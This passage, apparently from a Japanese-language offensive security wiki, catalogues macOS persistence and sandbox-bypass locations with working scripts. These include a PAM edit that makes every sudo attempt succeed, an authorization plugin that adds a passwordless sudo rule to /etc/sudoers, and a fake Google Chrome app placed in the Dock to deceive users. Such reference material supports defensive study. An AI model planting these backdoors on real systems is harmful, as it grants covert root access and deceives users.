- `019bdcd2` - hex形式の時刻。epochから経過した分数を表します。`0x019bdcd2` は10進数で `26991826` です。これに60を掛けると `1619509560` になり、これは `GMT: 2021. April 27., Tuesday 7:46:00` です。

job fileを出力すると、`at -c` を使って取得したものと同じ情報が含まれていることがわかります。

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- sandboxのbypassに有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、Folder Actionsを設定するには、引数付きで `osascript` を呼び出して **`System Events`** に接続できる必要があります
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Desktop、Documents、Downloadsなどの基本的なTCC permissionsがあります

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Root required
- **Trigger**: 指定したfolderへのアクセス
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: 指定したfolderへのアクセス

#### Description & Exploitation

Folder Actionsは、項目の追加や削除、folder windowのオープンやリサイズなど、folder内の変更によって自動的にtriggerされるscriptsです。これらのactionsはさまざまなタスクに利用でき、Finder UIやterminal commandsなど、異なる方法でtriggerできます。<sup>[17][18]</sup>

Folder Actionsを設定するには、次のような方法があります。

1. [Automator](https://support.apple.com/guide/automator/welcome/mac)でFolder Action workflowを作成し、serviceとしてインストールする。
2. folderのcontext menuにあるFolder Actions Setupから、scriptを手動で関連付ける。
3. OSAScriptを使用して `System Events.app` にApple Event messagesを送信し、Folder Actionをprogrammaticallyに設定する。
- このmethodはactionをsystemに組み込む場合に特に有用で、一定レベルのpersistenceを提供します。

次のscriptは、Folder Actionによって実行できる内容の例です。
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
上記のスクリプトをFolder Actionsで使用できるようにするには、次のコマンドでコンパイルします:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
スクリプトをコンパイルしたら、以下のスクリプトを実行してFolder Actionsを設定します。このスクリプトにより、Folder Actionsがグローバルに有効化され、以前にコンパイルしたスクリプトがDesktopフォルダに具体的に関連付けられます。
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
次のコマンドでセットアップスクリプトを実行します:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- GUIを介してこの永続化を実装する方法は次のとおりです。

実行されるscriptは次のとおりです。
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
次のコマンドでコンパイルします: `osacompile -l JavaScript -o folder.scpt source.js`

次の場所に移動します:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
次に、`Folder Actions Setup` appを開き、**監視したいフォルダ**を選択し、ケースに応じて **`folder.scpt`** を選択します（私の場合はoutput2.scpという名前にしました）:

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

これで、**Finder**でそのフォルダを開くと、スクリプトが実行されます。

この設定は、**`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** にある **plist** にbase64形式で保存されます。

では、GUIアクセスなしでこの永続化を準備してみましょう:

1. バックアップのため、**`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** を `/tmp` に**コピー**します:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. 先ほど設定したFolder Actionsを**削除**します:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

これで空の環境ができました。

3. バックアップファイルをコピーします: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Folder Actions Setup.appを開いて、この設定を読み込ませます: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> 私の場合はこれで動作しませんでしたが、writeupに記載されている手順は以下のとおりです:(

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- sandboxのbypassに有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、malicious applicationをsystem内にインストールしておく必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: ユーザーがDock内のappをクリックしたとき

#### Description & Exploitation

Dockに表示されるすべてのapplicationは、plist **`~/Library/Preferences/com.apple.dock.plist`**<sup>[19]</sup> 内で指定されています。

次のコマンドだけで**applicationを追加**できます:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
**social engineering**を利用して、**Google Chrome**などになりすましてdock内に表示し、実際に自分のスクリプトを実行させることができます：
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### カラーピッカー

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- 非常に特定のアクションが発生する必要がある
- 別の sandbox 内に移動する
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/Library/ColorPickers`
- Root が必要
- Trigger: color picker を使用
- `~/Library/ColorPickers`
- Trigger: color picker を使用

#### Description & Exploit

コードを含む color picker bundle を **Compile** し（例えば[**こちら**](https://github.com/viktorstrate/color-picker-plus)を使用できます）、constructor を追加して（[Screen Saver section](macos-auto-start-locations.md#screen-saver)のように）、bundle を `~/Library/ColorPickers` にコピーします。<sup>[20]</sup>

その後、color picker が Trigger されると、あなたのコードも同様に実行されるはずです。

ライブラリをロードする binary には、**非常に制限の厳しい sandbox** が適用されていることに注意してください: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- sandbox bypass に有用: **いいえ、自分の app を実行する必要があるため**
- TCC bypass: ???

#### Location

- 特定の app

#### Description & Exploit

Finder Sync Extension を備えたアプリケーションの例は、[**こちらで確認できます**](https://github.com/D00MFist/InSync)。

アプリケーションには `Finder Sync Extensions` を含めることができます。この extension は実行されるアプリケーション内に配置されます。さらに、extension がコードを実行できるようにするには、**有効な Apple developer certificate で署名されていること**、**sandbox 化されていること**（ただし、緩和された例外を追加できます）、そして次のような方法で登録されていることが必要です:<sup>[21][22]</sup>
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### スクリーンセーバー

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- sandbox の bypass に便利: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、最終的には一般的な application sandbox 内に入る
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- `/System/Library/Screen Savers`
- root が必要
- **Trigger**: screen saver を選択
- `/Library/Screen Savers`
- root が必要
- **Trigger**: screen saver を選択
- `~/Library/Screen Savers`
- **Trigger**: screen saver を選択

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### 説明と Exploit

Xcode で新しいプロジェクトを作成し、新しい **Screen Saver** を生成するテンプレートを選択します。次に、コードを追加します。例えば、以下のコードでログを生成できます。<sup>[23][24]</sup>

**Build** し、`.saver` bundle を **`~/Library/Screen Savers`** にコピーします。次に、Screen Saver GUI を開いてクリックするだけで、大量のログが生成されるはずです:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> このコードをロードするバイナリ（`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`）の entitlements 内に **`com.apple.security.app-sandbox`** があるため、**common application sandbox** 内に置かれることに注意してください。

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- sandboxのbypassに有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、最終的にはapplication sandbox内に入る
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- sandboxは非常に限定的に見える

#### Location

- `~/Library/Spotlight/`
- **Trigger**: Spotlight pluginによって管理される拡張子を持つ新しいfileが作成される。
- `/Library/Spotlight/`
- **Trigger**: Spotlight pluginによって管理される拡張子を持つ新しいfileが作成される。
- Root required
- `/System/Library/Spotlight/`
- **Trigger**: Spotlight pluginによって管理される拡張子を持つ新しいfileが作成される。
- Root required
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Spotlight pluginによって管理される拡張子を持つ新しいfileが作成される。
- New app required

#### Description & Exploitation

SpotlightはmacOSに組み込まれた検索機能であり、ユーザーに**コンピューター上のデータへの迅速かつ包括的なアクセス**を提供するよう設計されている。\
この高速な検索機能を実現するため、Spotlightは**独自のdatabase**を保持し、**ほとんどのfileをparse**してindexを作成することで、file名とその内容の両方を迅速に検索できるようにしている。<sup>[25]</sup>

Spotlightの基盤となる仕組みには、'mds'という名前のcentral processがあり、これは**'metadata server'**を意味する。このprocessがSpotlight service全体を統括する。これを補完する形で、複数の'mdworker' daemonが、さまざまなfile typeのindex作成など、多様なmaintenance taskを実行する（`ps -ef | grep mdworker`）。これらのtaskはSpotlight importer plugin、つまり**".mdimporter bundles"**によって可能になる。これによりSpotlightは、多様なfile formatのcontentを理解してindexを作成できる。

plugin、つまり**`.mdimporter`** bundleは前述の場所にあり、新しいbundleが出現すると1分以内にloadされる（serviceのrestartは不要）。これらのbundleは、**管理できるfile typeと拡張子**を示す必要がある。これにより、指定された拡張子を持つ新しいfileが作成された際に、Spotlightがそれらを使用する。

loadされている**すべての`mdimporters`**は、次のコマンドを実行して確認できる。
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
また、例えば **/Library/Spotlight/iBooksAuthor.mdimporter** は、次の種類のファイル（拡張子 `.iba` や `.book` など）を解析するために使用されます：
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> 他の `mdimporter` の Plist を確認しても、**`UTTypeConformsTo`** のエントリが見つからない場合があります。これは組み込みの _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) であり、拡張子を指定する必要がないためです。
>
> さらに、System のデフォルトプラグインが常に優先されるため、攻撃者がアクセスできるのは、Apple 独自の `mdimporters` によってインデックス化されていないファイルだけです。

独自の importer を作成するには、まずこのプロジェクトを利用できます: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer)。その後、名前と **`CFBundleDocumentTypes`** を変更し、サポートしたい拡張子に対応するよう **`UTImportedTypeDeclarations`** を追加して、それらを **`schema.xml`** に反映します。\
次に、処理対象の拡張子を持つファイルが作成されたときに payload を実行するよう、関数 **`GetMetadataForFile`** のコードを **変更**します。

最後に、新しい **`.mdimporter`** を **build して、前述の3つの場所のいずれかにコピー**します。ロードされたかどうかは、**ログを監視**するか **`mdimport -L.`** を確認することでチェックできます。

### ~~Preference Pane~~

> [!CAUTION]
> これはもう動作していないようです。

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- sandbox bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- 特定のユーザーアクションが必要
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

これはもう動作していないようです。<sup>[26]</sup>

## Root Sandbox Bypass

> [!TIP]
> ここでは、**root** で **ファイルに書き込む**だけで何かを実行できる、またはその他の **特殊な条件を必要とする**、**sandbox bypass** に有用な start location を紹介します。

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- sandbox bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし root である必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root が必要
- **Trigger**: 時刻になると実行
- `/etc/daily.local`, `/etc/weekly.local` または `/etc/monthly.local`
- Root が必要
- **Trigger**: 時刻になると実行

#### Description & Exploitation

Periodic scripts (**`/etc/periodic`**) は、**launch daemons** **`/System/Library/LaunchDaemons/com.apple.periodic*`** によって設定されているため実行されます。なお、`/etc/periodic/` に保存されたスクリプトは、**ファイルの所有者として実行**されるため、これは潜在的な privilege escalation には利用できません。<sup>[27]</sup>
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
**`/etc/defaults/periodic.conf`** に、実行されるその他の定期スクリプトが指定されています。
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
`/etc/daily.local`、`/etc/weekly.local`、`/etc/monthly.local` のいずれかのファイルを書き込める場合、それは**遅かれ早かれ実行されます**。

> [!WARNING]
> periodic script は、**そのスクリプトの所有者として実行される**ことに注意してください。したがって、通常のユーザーがスクリプトを所有している場合、そのユーザーとして実行されます（これにより権限昇格攻撃が防止される可能性があります）。

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし root である必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- 常に root が必要

#### Description & Exploitation

PAM は macOS 内部での容易な実行よりも、**persistence** と malware に重点を置いているため、このブログでは詳細な説明は行いません。**この technique をより深く理解するには writeup を読んでください**。<sup>[28]</sup>

以下で PAM modules を確認します:
```bash
ls -l /etc/pam.d
```
PAMを悪用した永続化/権限昇格の手法は、モジュール /etc/pam.d/sudo を変更し、先頭に次の行を追加するだけで実行できます:
```bash
auth       sufficient     pam_permit.so
```
したがって、次のようなものに**見える**ことになります:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
したがって、**`sudo` を使用する試みはすべて成功します**。

> [!CAUTION]
> このディレクトリは TCC によって保護されているため、ユーザーにアクセスを求めるプロンプトが表示される可能性が非常に高いことに注意してください。

もう1つの良い例は su です。ここでは、PAM modules にパラメーターを渡すことも可能であることがわかります（このファイルに backdoor を仕込むこともできます）。
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、root 権限を取得し、追加の設定を行う必要がある
- TCC bypass: ???

#### Location

- `/Library/Security/SecurityAgentPlugins/`
- root 権限が必要
- plugin を使用するよう authorization database を設定する必要もある

#### Description & Exploitation

ユーザーがログインしたときに実行され、persistence を維持する authorization plugin を作成できます。このような plugin の作成方法については、以前の writeup を確認してください（なお、適切に記述されていない plugin によってロックアウトされる可能性があり、その場合は recovery mode から Mac を修復する必要があります）。<sup>[29][30]</sup>
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Move** バンドルを読み込ませる場所へ移動します:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
最後に、この Plugin をロードする **rule** を追加します:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** は、認可 framework に **認可のために外部 mechanism を呼び出す必要がある**ことを伝えます。さらに、**`privileged`** によって root として実行されます。

次のようにトリガーします：
```bash
security authorize com.asdf.asdf
```
そして **staff group には sudo** access が必要です（確認するには `/etc/sudoers` を読み取ります）。

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- sandbox の bypass に便利: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、root である必要があり、ユーザーが man を使用しなければならない
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`/private/etc/man.conf`**
- root が必要
- **`/private/etc/man.conf`**: man が使用されるたび

#### 説明と Exploit

設定ファイル **`/private/etc/man.conf`** は、man の documentation files を開く際に使用する binary/script を指定します。そのため、executable への path を変更すれば、ユーザーが man を使用してドキュメントを読むたびに backdoor が実行されます。<sup>[31]</sup>

例えば **`/private/etc/man.conf`** に次のように設定します。
```
MANPAGER /tmp/view
```
そして `/tmp/view` を次のように作成します:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)

- sandbox の bypass に便利: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、root である必要があり、apache が実行中でなければならない
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd には entitlements がない

#### Location

- **`/etc/apache2/httpd.conf`**
- root が必要
- Trigger: Apache2 の起動時

#### Description & Exploit

`/etc/apache2/httpd.conf` に、次のような行を追加してモジュールをロードするよう指定できます:<sup>[32]</sup>
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
このようにすると、コンパイルしたモジュールが Apache によって読み込まれます。必要なのは、**有効な Apple 証明書で署名する**か、システムに**新しい信頼済み証明書を追加し、それで署名する**ことだけです。

その後、必要であれば、サーバーが起動することを確認するために、次を実行します。
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylbのコード例:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、root であり、auditd が実行中で、warning を発生させる必要がある
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`/etc/security/audit_warn`**
- root が必要
- **Trigger**: auditd が warning を検出したとき

#### 説明と Exploit

auditd が warning を検出するたびに、script **`/etc/security/audit_warn`** が **実行**されます。そのため、そこに payload を追加できます。<sup>[33]</sup>
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
`sudo audit -n`で警告を強制的に表示できます。

### Startup Items

> [!CAUTION] > **これは非推奨のため、これらのディレクトリには何も見つからないはずです。**

**StartupItem**は、`/Library/StartupItems/`または`/System/Library/StartupItems/`のいずれかに配置するディレクトリです。このディレクトリを作成したら、次の2つのファイルを含める必要があります。

1. **rc script**：起動時に実行されるシェルスクリプト。
2. **plist file**：`StartupParameters.plist`という名前で、さまざまな設定を含むファイル。

起動プロセスがこれらを認識して利用できるように、rc scriptと`StartupParameters.plist`ファイルの両方が**StartupItem**ディレクトリ内に正しく配置されていることを確認してください。

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> このコンポーネントは私の macOS では見つけられないため、詳細については writeup を確認してください

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Apple によって導入された **emond** は、開発が十分でない、または放棄された可能性があるように見える logging mechanism ですが、現在もアクセス可能です。Mac 管理者にとって特に有益ではないものの、この目立たない service は threat actor にとって巧妙な persistence method として利用でき、多くの macOS admin に気付かれない可能性があります。<sup>[34]</sup>

その存在を知っている場合、**emond** の悪意ある利用を特定するのは簡単です。この service 用のシステムの LaunchDaemon は、単一の directory 内で実行する scripts を探します。これを確認するには、次の command を使用できます:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### 所在地

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- root が必要
- **Trigger**: XQuartz 使用時

#### 説明と Exploit

XQuartz は **macOS にインストールされなくなった**ため、詳しい情報が必要な場合は writeup を確認してください。<sup>[3]</sup>

### ~~kext~~

> [!CAUTION]
> root であっても kext のインストールは非常に複雑なため、（exploit がない限り）サンドボックスからの脱出や persistence の手段としては考慮しません。

#### 所在地

KEXT を startup item としてインストールするには、**次のいずれかの場所にインストールする必要があります**:

- `/System/Library/Extensions`
- OS X operating system に組み込まれた KEXT ファイル
- `/Library/Extensions`
- 3rd party software によってインストールされた KEXT ファイル

